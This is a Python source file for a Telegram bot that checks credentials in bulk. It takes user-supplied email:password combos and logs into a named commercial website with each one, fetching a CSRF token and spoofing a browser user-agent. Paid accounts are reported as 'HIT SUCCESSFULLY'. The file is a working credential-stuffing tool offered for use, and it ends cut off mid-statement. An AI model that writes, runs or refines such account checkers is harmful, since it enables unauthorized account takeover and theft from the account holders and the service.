import requests
import time

def process_bg_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ BANG ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_bg_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /bg email:password")

def check_bg_account(account):
    email, password = account.split(':')
    
    # Initial GET request to fetch CSRF token
    login_page_url = "https://www.bang.com/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Origin": "https://www.bang.com",
        "Referer": "https://www.bang.com/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    session = requests.Session()
    response = session.get(login_page_url, headers=headers)

    if response.status_code != 200:
        return "Failed to retrieve CSRF token"

    token = extract_token(response.text)

    # Login request
    login_url = "https://www.bang.com/login_check"
    data = {
        "_username": email,
        "_password": password,
        "_remember_me": "true",
        "_token": token
    }

    response = session.post(login_url, headers=headers, json=data)

    if "success\":true" in response.text and "type\":\"paid\"" in response.text:
        return "HIT SUCCESSFULLY"
    elif "success\":false" in response.text:
        return "Invalid Credentials❌"
    else:
        return f"Unknown Response: {response.text}"

def extract_token(html):
    start = html.find("token: '") + len("token: '")
    end = html.find("',", start)
    return html[start:end]

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
   ​⬤
